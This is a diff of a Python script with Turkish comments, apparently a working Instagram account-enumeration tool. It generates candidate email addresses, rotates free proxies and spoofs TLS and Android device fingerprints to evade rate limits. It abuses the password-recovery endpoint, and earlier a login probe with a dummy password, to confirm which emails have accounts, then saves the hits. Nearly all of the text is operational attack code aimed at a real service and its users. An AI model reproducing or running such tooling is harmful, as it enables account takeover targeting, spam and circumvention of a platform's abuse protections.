@@ -3,9 +3,13 @@ import random
 import re
 import string
 import time
+import uuid
+import secrets
+import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from curl_cffi import requests
 from threading import local, Lock
+import httpx
 from fp.fp import FreeProxy
 
 # --- KONFİGÜRASYON ---
@@ -23,11 +27,11 @@ active_proxy = None
 # --- DİNAMİK TLS İMPERSONATE PROFİLLERİ ---
 IMPERSONATE_PROFILES = ["chrome119", "chrome120", "safari17_0", "edge101"]
 
-# --- THREAD-LOCAL SESSION VE TOKEN CACHE ---
+# --- THREAD-LOCAL SESSION ---
 thread_local = local()
 
 def test_proxy(proxy_str):
-    """Hızlıca proxy'nin canlı çalışıp çalışmadığını test eder"""
+    """Proxy'nin canlı çalışıp çalışmadığını çok kısa sürede test eder"""
     try:
         res = requests.get("https://httpbin.org/ip", proxies={"http": proxy_str, "https": proxy_str}, timeout=2)
         if res.status_code == 200:
@@ -37,27 +41,21 @@ def test_proxy(proxy_str):
     return False
 
 def fetch_all_protocols_proxies():
-    """Çoklu kaynaklardan hızlıca hammadde proxy havuzu toplar"""
+    """Hızlı ve güvenli proxy toplama havuzu"""
     raw_proxies = set()
     
-    # 1. Kaynak: GeoNode
     try:
-        geonode_url = "https://proxylist.geonode.com/api/proxy-list?limit=40&page=1&sort_by=lastChecked&sort_type=desc"
-        res = requests.get(geonode_url, timeout=2)
-        if res.status_code == 200:
-            for item in res.json().get("data", []):
-                ip, port, protocols = item.get("ip"), item.get("port"), item.get("protocols", [])
-                if ip and port:
-                    for proto in protocols:
-                        raw_proxies.add(f"{proto}://{ip}:{port}")
+        for _ in range(5):
+            fp = FreeProxy(https=True).get()
+            if fp:
+                raw_proxies.add(fp)
     except:
         pass
 
-    # 2. Kaynak: ProxyScrape
     try:
         for proto in ["http", "socks4", "socks5"]:
-            url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={proto}&timeout=2000&country=all"
-            res = requests.get(url, timeout=2)
+            url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={proto}&timeout=1500&country=all"
+            res = requests.get(url, timeout=1.5)
             if res.status_code == 200:
                 for line in res.text.splitlines():
                     if line.strip():
@@ -65,83 +63,42 @@ def fetch_all_protocols_proxies():
     except:
         pass
 
-    # 3. Kaynak: Free-Proxy
-    try:
-        for _ in range(2):
-            fp = FreeProxy(https=True).get()
-            if fp:
-                raw_proxies.add(fp)
-    except:
-        pass
-
     return list(raw_proxies)
 
 def get_fresh_working_proxy():
-    """İLK YAKALADIĞI ÇALIŞAN (LIVE) PROXY İLE ANINDA BAŞLAR (Bekleme süresini sıfırlar)"""
+    """Asla takılmadan ilk canlı proxy'yi yakalayıp döner"""
     global failed_proxies
-    print("\n🔍 [HIZLI PROXY] Havuz taranıyor, ilk çalışan live proxy yakalanacak...")
+    print("\n🔍 [HIZLI PROXY] Havuzdan ilk live proxy aranıyor...")
     
     pool = fetch_all_protocols_proxies()
+    if not pool:
+        try:
+            fp = FreeProxy(https=True).get()
+            if fp:
+                pool.add(fp)
+        except:
+            pass
+
     random.shuffle(pool)
-    
-    # Kara listedekileri ayıkla
     valid_pool = [p for p in pool if p not in failed_proxies]
     if not valid_pool:
-        print("⚠️ Kara liste temizleniyor...")
         with lock:
             failed_proxies.clear()
         valid_pool = pool
 
-    # Paralel test ile İLK BULUNAN LIVE PROXY'DE DÖNGÜYÜ KIR VE DÖN
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        future_to_proxy = {executor.submit(test_proxy, p): p for p in valid_pool}
+    with ThreadPoolExecutor(max_workers=25) as executor:
+        future_to_proxy = {executor.submit(test_proxy, p): p for p in valid_pool[:40]}
         for future in as_completed(future_to_proxy):
             proxy = future_to_proxy[future]
             try:
                 if future.result():
-                    print(f"⚡ [İLK LIVE PROXY YAKALANDI] ---> {proxy}")
+                    print(f"⚡ [İLK LIVE PROXY BULUNDU] ---> {proxy}")
                     return proxy
             except:
                 pass
                 
-    # Hiçbiri çalışmazsa kısa bir es verip tekrar dener
-    print("⚠️ Anlık live proxy bulunamadı, tekrar deneniyor...")
-    time.sleep(1)
+    time.sleep(0.5)
     return get_fresh_working_proxy()
-
-def get_session():
-    global active_proxy
-    if not active_proxy:
-        active_proxy = get_fresh_working_proxy()
-
-    if not hasattr(thread_local, "session") or getattr(thread_local, "current_proxy", None) != active_proxy:
-        chosen_profile = random.choice(IMPERSONATE_PROFILES)
-        proxies_dict = {
-            "http": active_proxy,
-            "https": active_proxy,
-        }
-        
-        session = requests.Session(impersonate=chosen_profile, proxies=proxies_dict)
-        thread_local.session = session
-        thread_local.current_proxy = active_proxy
-        
-        try:
-            home_res = session.get("https://www.instagram.com/", timeout=8)
-            csrftoken = session.cookies.get("csrftoken", domain=".instagram.com")
-            if not csrftoken:
-                for c in session.cookies:
-                    if c.name == "csrftoken":
-                        csrftoken = c.value
-                        break
-            thread_local.csrftoken = csrftoken or ""
-
-            lsd_match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', home_res.text)
-            thread_local.lsd_token = lsd_match.group(1) if lsd_match else "default_lsd"
-        except Exception:
-            thread_local.csrftoken = ""
-            thread_local.lsd_token = "default_lsd"
-            
-    return thread_local.session
 
 # --- TARANANLARI YÜKLE ---
 if os.path.exists(SCANNED_FILE):
@@ -161,14 +118,229 @@ def proxy_ip_reset(reason_msg=""):
 
     print(f"\n📡 [PROXY ROTASYON] {reason_msg} Yeni live proxy aranıyor...")
     active_proxy = get_fresh_working_proxy()
-    
-    if hasattr(thread_local, "session"):
-        delattr(thread_local, "session")
-    if hasattr(thread_local, "current_proxy"):
-        delattr(thread_local, "current_proxy")
-        
     stop_flag = False
-    print("🌐 Yeni live proxy ile yola devam ediliyor!")
+    print("🌐 Yeni live proxy ile devam ediliyor!")
+
+
+def verify_masked_email(full_email, response_text):
+    match = re.search(r"We sent a code to\s+([^\s<>\"]+)", response_text)
+    if not match:
+        return False
+    masked_email = match.group(1).rstrip(".,;")
+    if masked_email.lower() == full_email.lower():
+        return True
+    try:
+        m_local, m_domain = masked_email.split("@")
+        f_local, f_domain = full_email.split("@")
+    except ValueError:
+        return False
+    if not m_local or not f_local:
+        return False
+    if m_local[0].lower() != f_local[0].lower():
+        return False
+    if m_local[-1] != "*" and m_local[-1].lower() != f_local[-1].lower():
+        return False
+    if "*" in m_domain:
+        m_domain_prefix = m_domain.split("*")[0]
+        m_domain_suffix = m_domain.split(".")[-1]
+        if not f_domain.startswith(m_domain_prefix) or not f_domain.endswith(m_domain_suffix):
+            return False
+    else:
+        if m_domain.lower() != f_domain.lower():
+            return False
+    return True
+
+
+def check_reset(email):
+    global active_proxy, stop_flag
+    if not active_proxy:
+        active_proxy = get_fresh_working_proxy()
+
+    # Httpx client'a aktif proxy'yi entegre ediyoruz
+    client = httpx.Client(http2=True, timeout=20.0, proxies=active_proxy)
+    host = random.choice(["i.instagram.com", "b.i.instagram.com"])
+    bloks_version = "81afa1a45e1df628a85f745314cd89f1bc4e518dd0a4bf62951250fce559ed05"
+
+    def _headers(friendly_name):
+        return {
+            "accept-language": "en-US",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "ig-intended-user-id": "0",
+            "priority": "u=3",
+            "x-bloks-is-layout-rtl": "false",
+            "x-bloks-prism-button-version": "INDIGO_PRIMARY_BORDERED_SECONDARY",
+            "x-bloks-prism-colors-enabled": "true",
+            "x-bloks-extended-palette-gray": "true",
+            "x-bloks-extended-palette-indigo": "true",
+            "x-bloks-prism-extended-palette-polish-enabled": "false",
+            "x-bloks-prism-extended-palette-red": "true",
+            "x-bloks-prism-extended-palette-rest-of-colors": "true",
+            "x-bloks-prism-font-enabled": "true",
+            "x-bloks-prism-indigo-link-version": "1",
+            "x-bloks-version-id": bloks_version,
+            "x-fb-client-ip": "True",
+            "x-fb-connection-type": "WIFI",
+            "x-fb-friendly-name": f"IgApi: {friendly_name}/",
+            "x-fb-request-analytics-tags": '{"network_tags":{"product":"567067343352427","surface":"undefined","request_category":"api","purpose":"fetch","retry_attempt":"0"}}',
+            "x-fb-server-cluster": "True",
+            "x-ig-android-id": f"android-{str(uuid.uuid4().hex)[:16]}",
+            "x-ig-app-id": "567067343352427",
+            "x-ig-app-locale": "en_US",
+            "x-ig-bandwidth-speed-kbps": "7060.000",
+            "x-ig-bandwidth-totalbytes-b": "13597412",
+            "x-ig-bandwidth-totaltime-ms": "1586",
+            "x-ig-client-endpoint": "IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.ar.search",
+            "x-ig-capabilities": "3brTv10=",
+            "x-ig-connection-type": "WIFI",
+            "x-ig-device-id": f"{str(uuid.uuid4())}",
+            "x-ig-device-locale": "en_US",
+            "x-ig-family-device-id": f"{str(uuid.uuid4())}",
+            "x-ig-is-foldable": "false",
+            "x-ig-mapped-locale": "en_US",
+            "x-ig-timezone-offset": "19800",
+            "x-ig-www-claim": "0",
+            "x-pigeon-rawclienttime": f"{int(time.time())}.030",
+            "x-pigeon-session-id": f"UFS-{str(uuid.uuid4())}-1",
+            "x-tigon-is-retry": "False",
+            "user-agent": "Instagram 440.0.0.32.73 Android (30/11; 480dpi; 1080x2340; OnePlus; LE2110; starlte; qcom; en_US; 348123456)",
+            "x-fb-conn-uuid-client": f"{str(uuid.uuid4())}",
+            "x-fb-http-engine": "Tigon/MNS/TCP",
+        }
+
+    def _bk_context():
+        return json.dumps({
+            "bloks_version": bloks_version,
+            "styles_id": "instagram",
+            "theme_params": [{"value": ["three_neutral_gray"], "design_system_name": "XMDS"}],
+        }, separators=(",", ":"))
+
+    device_id = f"android-{str(uuid.uuid4().hex)[:16]}"
+    family_device_id = str(uuid.uuid4())
+    waterfall_id = str(uuid.uuid4())
+    event_request_id = str(uuid.uuid4())
+    aac_init_timestamp = int(time.time())
+    aacjid = str(uuid.uuid4())
+    aaccs = "AW" + secrets.token_urlsafe(32).replace("=", "").replace("+", "").replace("/", "")
+
+    params = {
+        "client_input_params": {
+            "blocked_uids": [],
+            "aac": json.dumps({
+                "aac_init_timestamp": aac_init_timestamp,
+                "aacjid": aacjid,
+                "aaccs": aaccs,
+            }),
+            "flash_call_permissions_status": {
+                "READ_PHONE_STATE": "GRANTED",
+                "READ_CALL_LOG": "DENIED",
+                "ANSWER_PHONE_CALLS": "DENIED",
+            },
+            "was_headers_prefill_available": 0,
+            "network_bssid": None,
+            "sfdid": "",
+            "fetched_email_token_list": {},
+            "search_query": email,
+            "auth_secure_device_id": "",
+            "ig_oauth_token": [],
+            "cloud_trust_token": None,
+            "was_headers_prefill_used": 0,
+            "sso_accounts_auth_data": [],
+            "encrypted_msisdn": "",
+            "device_network_info": {
+                "default_subscription_info": {
+                    "network_type": 13, "is_data_roaming": 1, "is_esim": 0, "is_gsm_roaming": 0,
+                    "is_sim_sms_capable": None, "is_mobile_data_enabled": 1, "sim_carrier_id": -1,
+                    "sim_carrier_id_name": None, "sim_state": 5, "sim_operator": "310005",
+                    "sim_operator_name": "Verizon Wireless", "signal_strength": None,
+                    "group_id_level_1": None, "network_operator": "310005",
+                },
+                "sim_count": 1, "is_wifi": 1, "is_airplane_mode": 0,
+                "is_active_network_cellular": 0, "is_device_sms_capable": 1,
+                "active_subscriptions_info": [{
+                    "network_type": 13, "is_data_roaming": 1, "is_esim": 0, "is_gsm_roaming": 0,
+                    "is_sim_sms_capable": None, "is_mobile_data_enabled": 1, "sim_carrier_id": -1,
+                    "sim_carrier_id_name": None, "sim_state": 5, "sim_operator": "310005",
+                    "sim_operator_name": "Verizon Wireless", "signal_strength": None,
+                    "group_id_level_1": None, "network_operator": "310005",
+                }],
+            },
+            "text_input_id": "4cbr8a:53",
+            "zero_balance_state": None,
+            "android_build_type": "release",
+            "accounts_list": [],
+            "is_oauth_without_permission": 0,
+            "ig_android_qe_device_id": str(uuid.uuid4()),
+            "gms_incoming_call_retriever_eligibility": "not_eligible",
+            "search_screen_type": "email_or_username",
+            "is_whatsapp_installed": 0,
+            "lois_settings": {"lois_token": ""},
+            "ig_vetted_device_nonce": None,
+            "headers_infra_flow_id": "",
+            "fetched_email_list": [],
+        },
+        "server_params": {
+            "event_request_id": event_request_id,
+            "is_from_logged_out": 1,
+            "layered_homepage_experiment_group": "Deploy: Not in Experiment",
+            "device_id": device_id,
+            "login_surface": "login_home",
+            "waterfall_id": waterfall_id,
+            "INTERNAL__latency_qpl_instance_id": 26256860200107,
+            "is_platform_login": 0,
+            "context_data": "",
+            "login_entry_point": "logged_out",
+            "INTERNAL__latency_qpl_marker_id": 36707139,
+            "family_device_id": family_device_id,
+            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
+            "access_flow_version": "pre_mt_behavior",
+            "is_from_logged_in_switcher": 0,
+            "qe_device_id": str(uuid.uuid4()),
+        },
+    }
+
+    payload = {
+        "params": json.dumps(params, separators=(",", ":")),
+        "bk_client_context": _bk_context(),
+        "bloks_versioning_id": bloks_version,
+    }
+
+    try:
+        response = client.post(
+            f"https://{host}/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
+            data=payload,
+            headers=_headers("bloks/async_action/com.bloks.www.caa.ar.search.async"),
+        )
+
+        response_text = response.text
+        clean_response = response_text.replace("/", "").replace("\\", "")
+        
+        if response.status_code in (403, 429) or "please wait" in clean_response.lower() or "feedback_required" in clean_response.lower():
+            print(f"🚨 [PROXİ PATLADI / ENGEL] HTTP Status: {response.status_code}")
+            with lock:
+                if not stop_flag:
+                    stop_flag = True
+            return "error"
+
+        if "We sent a code to" in clean_response:
+            is_verified = verify_masked_email(email, clean_response)
+            if is_verified:
+                print(f"🟢 [KESİN HESAP BULUNDU] {email}")
+                with lock:
+                    with open(INPUT_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"{email}\n")
+                return "good"
+            else:
+                return "bad"
+        else:
+            return "bad"
+
+    except Exception as e:
+        with lock:
+            if not stop_flag:
+                stop_flag = True
+        return "error"
+    finally:
+        client.close()
 
 
 def auditor_worker(username, target_domain):
@@ -176,88 +348,20 @@ def auditor_worker(username, target_domain):
     if stop_flag:
         return False, None
 
-    session = get_session()
     full_email = f"{username}@{target_domain}"
+    time.sleep(random.uniform(0.1, 0.4))
     
-    url = "https://www.instagram.com/accounts/login/ajax/"
-    timestamp = int(time.time())
-    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:11111111"
+    result = check_reset(full_email)
     
-    try:
-        csrftoken = getattr(thread_local, "csrftoken", "")
-        lsd_token = getattr(thread_local, "lsd_token", "default_lsd")
-
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            "X-IG-App-ID": "936619743392459",
-            "X-CSRFToken": csrftoken,
-            "X-FB-LSD": lsd_token,
-            "X-Requested-With": "XMLHttpRequest",
-            "Referer": "https://www.instagram.com/accounts/login/",
-            "Origin": "https://www.instagram.com"
-        }
-
-        data = {
-            "username": full_email,
-            "enc_password": enc_password,
-            "queryParams": "{}",
-            "optIntoOneTap": "false",
-            "trustedDeviceRecords": "{}"
-        }
-
-        time.sleep(random.uniform(0.2, 0.6))
-        res = session.post(url, headers=headers, data=data, timeout=12)
-        
-        try:
-            res_json = res.json()
-        except:
-            res_json = {}
-
-        msg = str(res_json.get("message", ""))
-        error_type = str(res_json.get("error_type", ""))
-        status_code = res.status_code
-        
-        if status_code not in (200, 400) or status_code in (403, 429) or "please wait" in msg.lower() or "limit" in msg.lower() or "feedback_required" in msg.lower():
-            with lock:
-                if not stop_flag:
-                    stop_flag = True
-                    print(f"\n🚨 [ENGEL / HATA] HTTP Status: {status_code} | Mesaj: {msg}")
-            return True, username
-
-        with lock:
-            if status_code == 400 and error_type == "UserInvalidCredentials":
-                print(f"🟢 [HESAP BULUNDU] {full_email}")
-                with open(INPUT_FILE, "a", encoding="utf-8") as f:
-                    f.write(f"{full_email}\n")
-            
-            elif res_json.get("checkpoint_url") or msg == "checkpoint_required":
-                print(f"🟠 [CHECKPOINT] {full_email}")
-                with open(INPUT_FILE, "a", encoding="utf-8") as f:
-                    f.write(f"{full_email}\n")
-            
-            elif "linked Facebook account" in msg:
-                print(f"🔵 [FACEBOOK] {full_email}")
-                with open(INPUT_FILE, "a", encoding="utf-8") as f:
-                    f.write(f"{full_email}\n")
-            
-            elif "email to help you get back" in msg:
-                print(f"🟣 [RECOVERY] {full_email}")
-                with open(INPUT_FILE, "a", encoding="utf-8") as f:
-                    f.write(f"{full_email}\n")
-                
-        return True, username
-        
-    except Exception as e:
-        with lock:
-            if not stop_flag:
-                stop_flag = True
+    if result == "error":
         return False, None
+        
+    return True, username
 
 
 def main():
     global stop_flag
-    print("\n--- INSTAGRAM TARAMA MODÜLÜ (HIZLI İLK LIVE PROXY MODU) ---")
+    print("\n--- INSTAGRAM KESİN DOĞRULAMALI HIZLI TARAMA MODÜLÜ ---")
     
     target_domain = os.environ.get("TARGET_DOMAIN", "hi2.in")
     prefix = os.environ.get("PREFIX", "")
